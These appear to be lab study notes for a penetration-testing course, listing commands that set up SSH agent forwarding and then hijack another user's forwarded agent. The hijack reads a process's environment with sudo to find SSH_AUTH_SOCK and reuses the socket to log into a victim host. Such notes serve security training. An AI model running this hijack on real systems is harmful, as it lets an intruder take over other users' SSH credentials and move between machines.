#Copy pub key to remote machine
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller

#Add the key to the agent 
ssh-add ~/.ssh/id_rsa

#List added key 
ssh-add -L

#Set the local SSH config file in ~/.ssh/config to forward request

ForwardAgent yes

#On the intermediate server, set in /etc/ssh/sshd_config
AllowAgentForwarding yes

#Start ssh-agrnt manually on Kali
kali@kali:~$ eval `ssh-agent`

#get pid of process
pstree -p offsec | grep ssh

#get environnement value of the process
cat /proc/16381/environ

#grep for socket (46740 being the process id)
sudo cat /proc/46740/environ | strings | grep SSH_AUTH_SOCK

SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l

SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
